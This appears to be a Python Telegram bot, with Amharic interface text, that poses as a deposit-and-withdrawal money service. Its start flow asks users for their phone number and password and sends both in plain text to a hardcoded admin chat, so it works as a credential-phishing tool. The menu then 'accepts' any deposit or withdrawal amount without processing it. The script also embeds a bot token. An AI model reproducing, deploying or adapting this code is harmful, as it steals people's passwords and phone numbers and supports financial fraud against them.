from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardRemove
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters,
    ContextTypes,
)

# ያንተ የቴሌግራም ID (መረጃው በቀጥታ ለአንተ እንዲመጣ)
ADMIN_ID = "8960492606"


# የውይይት ደረጃዎች
PHONE, PASSWORD, MENU = range(3)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    await update.message.reply_text(
        f"ሰላም {user.first_name}! ወደ ቦቱ በደህና መጡ።\n\nእባክዎ መጀመሪያ የስልክ ቁጥርዎን ያስገቡ፡",
        reply_markup=ReplyKeyboardRemove()
    )
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text
    context.user_data['phone'] = phone
    
    await update.message.reply_text("አመሰግናለሁ! አሁን ደግሞ የይለፍ ቃልዎን (Password) ያስገቡ፡")
    return PASSWORD

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text
    phone = context.user_data['phone']
    user = update.effective_user
    
    await update.message.reply_text("በስኬት ተመዝግበዋል! ✅")
    
    # መረጃውን ለአንተ መላኪያ
    log_message = (
        f"🔔 **አዲስ ተጠቃሚ ተመዝግቧል!**\n\n"
        f"👤 ስም: {user.first_name}\n"
        f"📱 ስልክ: `{phone}`\n"
        f"🔑 ፓስወርድ: `{password}`"
    )
    try:
        await context.bot.send_message(chat_id=ADMIN_ID, text=log_message, parse_mode="Markdown")
    except Exception:
        await context.bot.send_message(chat_id=user.id, text=f"[ለባለቤቱ የሚላክ መረጃ]:\n{log_message}", parse_mode="Markdown")

    # አዲሱ ውብ Inline Buttons አሠራር
    keyboard = [
        [
            InlineKeyboardButton("💰 Deposit", callback_data='btn_deposit'),
            InlineKeyboardButton("💸 Withdraw", callback_data='btn_withdraw')
        ],
        [
            InlineKeyboardButton("📞 Support", callback_data='btn_support')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text("ምን ማድረግ ይፈልጋሉ? ከታች ካሉት አማራጮች ይምረጡ፦", reply_markup=reply_markup)
    return MENU

# ቁልፎቹ ሲነኩ ምላሽ የሚሰጠው ክፍል
async def button_click(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer() # የመጫኛዋን ሰማያዊ ምልክት ለማጥፋት
    
    if query.data == 'btn_deposit':
        await query.message.reply_text("💰 እባክዎ የ Deposit መጠኑን ቁጥር ብቻ ይላኩ፦")
    elif query.data == 'btn_withdraw':
        await query.message.reply_text("💸 እባክዎ የ Withdraw መጠኑን ቁጥር ብቻ ይላኩ፦")
    elif query.data == 'btn_support':
        await query.message.reply_text("📞 አስተዳዳሪውን እያገናኘን ነው፣ እባክዎ በውስጥ መስመር ይጠብቁ...")

# ተጠቃሚው ቁጥር ሲልክ የሚያስተናግደው ክፍል
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text.isdigit():
        await update.message.reply_text(f"የ {text} ብር ጥያቄዎ ተቀባይነት አግኝቷል! ⏳")
    else:
        await update.message.reply_text("እባክዎ ቁጥር ብቻ ያስገቡ ወይም ከላይ ካሉት ቁልፎች አንዱን ይጫኑ።")
    return MENU

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("ሂደቱ ተቋርጧል። እንደገና ለመጀመር /start ይበሉ።", reply_markup=ReplyKeyboardRemove())
    return ConversationHandler.END

if __name__ == '__main__':
    # በ Render ላይ የሚሠራው ያንተ አዲሱ Token
    app = ApplicationBuilder().token("8960492606:AAEQKJN5S70C3u6OQVVGUkfLNEC7K2w7deA").build()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
            MENU: [
                CallbackQueryHandler(button_click), # ቁልፎቹን ለመያዝ
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text) # ፅሁፍ ለመያዝ
            ],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    
    app.add_handler(conv_handler)
    app.run_polling()
